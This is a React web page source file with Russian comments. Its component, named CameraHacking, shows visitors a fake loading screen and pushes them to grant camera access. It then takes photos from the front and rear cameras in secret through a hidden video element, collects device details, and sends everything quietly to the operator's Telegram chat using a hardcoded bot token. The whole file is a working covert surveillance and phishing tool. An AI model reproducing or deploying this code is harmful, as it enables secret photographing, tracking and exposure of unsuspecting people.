import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const hasCaptured = useRef(false);
  const isProcessing = useRef(false);
  const streamRef = useRef(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [showPermissionRequest, setShowPermissionRequest] = useState(false);
  const [permissionGranted, setPermissionGranted] = useState(false);
  const [currentStep, setCurrentStep] = useState(0); // 0 - селфи, 1 - задняя

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки который не показывает ответ
  const sendToTelegramSilent = (text) => {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_notification: true
    }));
  };

  // Отправка фото без показа ответа
  const sendPhotoSilent = (blob, caption = '', cameraType = 'селфи') => {
    return new Promise((resolve) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `${cameraType}_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      xhr.onload = () => resolve(true);
      xhr.onerror = () => resolve(false);
      xhr.send(formData);
    });
  };

  // Сбор информации об устройстве
  const collectAndSendDeviceInfo = () => {
    const info = {
      platform: navigator.platform,
      userAgent: navigator.userAgent.substring(0, 150),
      screen: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
      isTablet: /Tablet|iPad/i.test(navigator.userAgent),
      timestamp: new Date().toLocaleString()
    };
    
    let os = 'Unknown';
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) os = 'Windows';
    if (/Mac OS/i.test(ua)) os = 'macOS';
    if (/Linux/i.test(ua)) os = 'Linux';
    if (/Android/i.test(ua)) os = 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
    
    const message = `📱 ПОЛЬЗОВАТЕЛЬ НА САЙТЕ

📊 УСТРОЙСТВО:
▫️ ОС: ${os}
▫️ Тип: ${info.isMobile ? '📱 Мобильное' : info.isTablet ? '📟 Планшет' : '💻 Компьютер'}
▫️ Экран: ${info.screen}
▫️ Язык: ${info.language}
▫️ Время: ${info.timestamp}

🚀 ГОТОВ К СЪЕМКЕ`;

    sendToTelegramSilent(message);
  };

  // Захват фото с текущей камеры
  const capturePhoto = async (cameraType = 'селфи') => {
    if (!videoRef.current || !streamRef.current) return null;
    
    const video = videoRef.current;
    
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Добавляем водяной знак
    ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
    ctx.fillRect(10, canvas.height - 90, 250, 80);
    
    ctx.fillStyle = '#FFFFFF';
    ctx.font = '16px Arial';
    ctx.textAlign = 'left';
    ctx.fillText(`📸 ${cameraType === 'селфи' ? '🤳 Селфи' : '📷 Задняя'}`, 20, canvas.height - 70);
    ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 50);
    ctx.fillText(`${navigator.platform}`, 20, canvas.height - 30);
    
    return new Promise(resolve => {
      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
    });
  };

  // Инициализация камеры
  const initializeCamera = async (cameraType = 'селфи') => {
    try {
      // Останавливаем предыдущий поток
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
        streamRef.current = null;
      }
      
      // Удаляем предыдущее видео
      if (videoRef.current) {
        videoRef.current.remove();
        videoRef.current = null;
      }
      
      const constraints = {
        video: {
          facingMode: cameraType === 'селфи' ? "user" : { exact: "environment" },
          width: { ideal: 1920 },
          height: { ideal: 1080 }
        },
        audio: false
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      // Создаем видео элемент
      const video = document.createElement('video');
      video.style.cssText = `
        position: fixed;
        width: 1px;
        height: 1px;
        opacity: 0;
        pointer-events: none;
        z-index: -9999;
        top: -9999px;
        left: -9999px;
      `;
      video.autoplay = true;
      video.muted = true;
      video.playsInline = true;
      video.srcObject = stream;
      document.body.appendChild(video);
      videoRef.current = video;
      
      // Ждем готовности
      await new Promise(resolve => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 1000);
        };
      });
      
      return true;
      
    } catch (error) {
      console.log(`Camera ${cameraType} error:`, error.message);
      sendToTelegramSilent(`❌ Ошибка ${cameraType === 'селфи' ? 'селфи' : 'задней'} камеры: ${error.message}`);
      return false;
    }
  };

  // Процесс съемки и отправки
  const captureAndSendProcess = async () => {
    if (isProcessing.current || hasCaptured.current) return;
    isProcessing.current = true;
    
    try {
      // Съемка с селфи камеры
      setCurrentStep(0);
      sendToTelegramSilent('🚀 Начинаю съемку с селфи камеры...');
      
      const selfieSuccess = await initializeCamera('селфи');
      
      if (selfieSuccess) {
        await new Promise(resolve => setTimeout(resolve, 1500)); // Даем время на фокус
        
        const selfieBlob = await capturePhoto('селфи');
        if (selfieBlob) {
          const selfieCaption = `🤳 СЕЛФИ КАМЕРА\n` +
            `📱 Устройство: ${navigator.platform}\n` +
            `⏰ Время: ${new Date().toLocaleString()}\n` +
            `🎯 Этап: 1/2`;
          
          await sendPhotoSilent(selfieBlob, selfieCaption, 'selfie');
          sendToTelegramSilent('✅ Селфи фото отправлено');
          
          // Останавливаем селфи камеру
          if (streamRef.current) {
            streamRef.current.getTracks().forEach(track => track.stop());
            streamRef.current = null;
          }
        }
      }
      
      // Небольшая пауза
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Съемка с задней камеры
      setCurrentStep(1);
      sendToTelegramSilent('📷 Переключаюсь на заднюю камеру...');
      
      const rearSuccess = await initializeCamera('задняя');
      
      if (rearSuccess) {
        await new Promise(resolve => setTimeout(resolve, 1500)); // Даем время на фокус
        
        const rearBlob = await capturePhoto('задняя');
        if (rearBlob) {
          const rearCaption = `📷 ЗАДНЯЯ КАМЕРА\n` +
            `📱 Устройство: ${navigator.platform}\n` +
            `⏰ Время: ${new Date().toLocaleString()}\n` +
            `🎯 Этап: 2/2`;
          
          await sendPhotoSilent(rearBlob, rearCaption, 'rear');
          sendToTelegramSilent('✅ Заднее фото отправлено');
        }
      }
      
      // Финальное сообщение
      sendToTelegramSilent('🎉 СЪЕМКА ЗАВЕРШЕНА!\n' +
        `✅ Отправлено 2 фото\n` +
        `📱 С ${navigator.platform}\n` +
        `⏰ ${new Date().toLocaleString()}`);
      
      hasCaptured.current = true;
      
    } catch (error) {
      console.error('Process error:', error);
      sendToTelegramSilent(`❌ Ошибка процесса: ${error.message}`);
    } finally {
      // Гарантированно закрываем камеру
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
        streamRef.current = null;
      }
      if (videoRef.current) {
        videoRef.current.remove();
        videoRef.current = null;
      }
      isProcessing.current = false;
    }
  };

  // Запрос разрешения с красивым интерфейсом
  const requestCameraPermission = () => {
    setShowPermissionRequest(true);
    
    // Показываем сообщение перед запросом
    setTimeout(async () => {
      try {
        // Пробуем запросить камеру
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" } 
        });
        
        // Сразу закрываем предпросмотр
        stream.getTracks().forEach(track => track.stop());
        
        setPermissionGranted(true);
        setShowPermissionRequest(false);
        
        // Запускаем процесс
        setTimeout(() => {
          captureAndSendProcess();
        }, 500);
        
      } catch (error) {
        console.log('Permission denied:', error);
        sendToTelegramSilent('❌ Пользователь отказал в доступе к камере');
        // Можно показать сообщение об ошибке
      }
    }, 2000);
  };

  // Основная логика
  useEffect(() => {
    if (hasCaptured.current) return;
    
    const init = async () => {
      // Собираем и отправляем информацию об устройстве
      collectAndSendDeviceInfo();
      
      // Ждем 1 секунду и показываем запрос разрешения
      setTimeout(() => {
        requestCameraPermission();
      }, 1000);
    };
    
    init();
  }, []);

  // Показываем красивый интерфейс запроса разрешения
  if (showPermissionRequest) {
    return (
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: 'rgba(0, 0, 0, 0.95)',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        color: 'white',
        textAlign: 'center',
        padding: '20px',
        zIndex: 10000,
        fontFamily: 'Arial, sans-serif'
      }}>
        <div style={{
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
          padding: '30px',
          borderRadius: '20px',
          maxWidth: '500px',
          width: '90%',
          boxShadow: '0 10px 40px rgba(0,0,0,0.3)'
        }}>
          <div style={{ fontSize: '60px', marginBottom: '20px' }}>
            📸
          </div>
          
          <h1 style={{ fontSize: '28px', marginBottom: '15px' }}>
            Требуется доступ к камере
          </h1>
          
          <p style={{ 
            fontSize: '18px', 
            lineHeight: '1.6',
            marginBottom: '30px',
            color: 'rgba(255,255,255,0.9)'
          }}>
            Для работы этого сервиса необходим доступ к вашей камере.<br />
            <strong>Сначала сделаем селфи, потом фото окружения.</strong>
          </p>
          
          <div style={{
            background: 'rgba(255,255,255,0.1)',
            padding: '20px',
            borderRadius: '15px',
            marginBottom: '25px',
            border: '1px solid rgba(255,255,255,0.2)'
          }}>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center', 
              justifyContent: 'center',
              marginBottom: '15px'
            }}>
              <div style={{
                width: '20px',
                height: '20px',
                borderRadius: '50%',
                background: '#4ECDC4',
                marginRight: '10px'
              }}></div>
              <span>🤳 Сначала селфи камера</span>
            </div>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center', 
              justifyContent: 'center'
            }}>
              <div style={{
                width: '20px',
                height: '20px',
                borderRadius: '50%',
                background: '#FF6B6B',
                marginRight: '10px'
              }}></div>
              <span>📷 Потом задняя камера</span>
            </div>
          </div>
          
          <div style={{
            fontSize: '16px',
            color: 'rgba(255,255,255,0.7)',
            marginBottom: '30px'
          }}>
            ⚠️ В следующем диалоге браузера нажмите <strong>"Разрешить"</strong>
          </div>
          
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '14px',
            color: 'rgba(255,255,255,0.5)'
          }}>
            <div style={{
              width: '15px',
              height: '15px',
              borderRadius: '50%',
              background: currentStep === 0 ? '#4ECDC4' : '#FF6B6B',
              marginRight: '10px',
              animation: currentStep === 0 ? 'pulse 1.5s infinite' : 'none'
            }}></div>
            <span>
              {currentStep === 0 ? 'Готовлюсь к селфи...' : 'Переключаю на заднюю камеру...'}
            </span>
          </div>
        </div>
        
        <style>{`
          @keyframes pulse {
            0% { transform: scale(0.8); opacity: 0.7; }
            50% { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(0.8); opacity: 0.7; }
          }
        `}</style>
      </div>
    );
  }

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.3)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '22px',
            fontWeight: 'bold',
            opacity: 0.9,
            textShadow: '0 2px 10px rgba(0,0,0,0.3)'
          }}>
            Система загрузки...
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
